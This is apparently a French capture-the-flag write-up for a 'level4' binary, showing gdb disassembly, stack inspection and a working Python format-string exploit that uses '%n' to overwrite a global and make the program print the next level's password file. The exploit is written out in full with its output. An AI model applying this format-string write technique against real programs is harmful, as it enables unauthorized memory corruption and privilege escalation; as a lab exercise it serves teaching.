@@ -1,0 +1,63 @@
+On a un fichier binaire. à l'execution, il attend qu'on ecrive, puit réecrit notre string et quitte le programme.
+En ouvrant avec gdb, on s'aperçoit que le main appelle une fonction n, et que dans cette fonction, il y a un appelle system.
+Cet appelle system execute un /bin/cat /home/user/level5/.pass :
+
+(gdb) disas n
+   | ...
+   │0x8048499 <n+66>        movl   $0x8048590,(%esp)                                                  │
+   │0x80484a0 <n+73>        call   0x8048360 <system@plt>
+   | ...
+(gdb) x/s 0x8048590
+    0x8048590:       "/bin/cat /home/user/level5/.pass"
+
+On doit donc parvenir à éxecuter ce programme.
+L'execution de l'appelle system se troouve après une condition de comparaison:
+(gdb) disas n
+   | ...
+   │0x804848d <n+54>        mov    0x8049810,%eax                                                     │
+   │0x8048492 <n+59>        cmp    $0x1025544,%eax                                                    │
+   │0x8048497 <n+64>        jne    0x80484a5 <n+78>
+   | ...
+(gdb) x/s 0x8049810
+    0x8049810 <m>:   ""
+On comprend donc que c'est le même principe que le level précédent : pour accéder à notre appelle system,
+il faut remplir la condition m = $0x1025544, c'est a dire en decimal m = 16930116
+
+Or on voit que la fonction n appelle une fonction p, qui execute un printf SANS string de parsage.
+On va donc tenté de faire la même chose que précédement.
+C'est à dire utilisé le buffer, pour introduire l'addresse de m à une position de la stack qui est accessible,
+puis remonter jusqu'a cette position pour introduire le nombre voulu, à l'aide du modifier n de printf.
+on trouve d'abord l'emplacement du buffer, on utilisera cette fois ci gdb: 
+(gdb) disas p
+    0x08048450 <+12>:	call   0x8048340 <printf@plt>
+On met un breakpoint à l'addresse de printf, puisqu'on cherche la position de m par rapport à lui.
+(gdb) b *0x08048450
+(gdb) run
+    Starting program: /home/user/level4/level4 
+    AAAA
+
+    Breakpoint 1, 0x08048450 in p ()
+(gdb) x/20x $sp     (=> on veut voir les 20 dernier adresse dans la stack)
+    0xbffff4e0:	0xbffff510	0xb7ff26b0	0xbffff754	0xb7fd0ff4
+    0xbffff4f0:	0x00000000	0x00000000	0xbffff718	0x0804848d
+    0xbffff500:	0xbffff510	0x00000200	0xb7fd1ac0	0xb7ff37d0
+    0xbffff510:	0x41414141	0xb7e2000a	0x00000001	0xb7fef305
+    0xbffff520:	0xbffff578	0xb7fde2d4	0xb7fde334	0x00000007
+Le premier élément correspond à notre AAAA que l'on a inscrit:
+(gdb)  x/s 0xbffff510
+    0xbffff510:	 "AAAA\n"
+Et on voir que l'addresse correspondant à nos A ( 0x41414141) se trouve 12 addresse plus loin,
+notre buffer se trouve donc à la 12e position.
+
+Il se trouve à la 12e position.                       
+$ python -c 'print "\x08\x04\x98\x10"[::-1] + (16930116 - 4) * "A" + "%12$n"' | ./level4
+    �AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+    Traceback (most recent call last):
+    File "<string>", line 1, in <module>
+    IOError: [Errno 32] Broken pipe
+Il semblerait que l'écriture de 16 millions de charactere ne soit pas possible. Un "broken pipe error" voudrait dire que le nombre de caractere envoyé dans le pipe est trop grand et que le socket se ferme avant qu'il ai pu tout envoyé.
+
+Mais il semblerait qu'il y ai une autre solution pour donner à n notre nombre de caractère sans faire crasher le programme : les padding du printf.
+En effet, alors qu'avec l'autre méthode, on envoie plus de 16 millions de A dans le pipe, ici seule les caractères suggérant le padding (%16930112x) vont etre envoyé, ce qui résout le problème du broken pipe.
+$ python -c 'print "\x08\x04\x98\x10"[::-1] + "%16930112x" + "%12$n"' | ./level4
+    0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
